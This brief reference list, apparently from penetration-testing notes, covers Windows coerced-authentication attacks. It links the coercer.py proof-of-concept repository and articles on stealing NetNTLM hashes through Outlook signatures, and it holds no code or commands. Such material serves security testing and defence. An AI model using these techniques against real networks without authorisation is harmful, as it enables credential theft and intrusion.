* The author of the "coercer.py" PoC (p0dalirius) has generated many potential forced authentication endpoints and prepared a near-working PoC for the majority of the endpoints. However, a little research and triage is needed in each case to make the attacks viable.
	* p0dalirius GitHub: Windows Coerced Authentication Methods -<br />[https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
* [https://research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/](https://research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/)
* [https://pwnshift.github.io/2021/08/12/hashes.html](https://pwnshift.github.io/2021/08/12/hashes.html)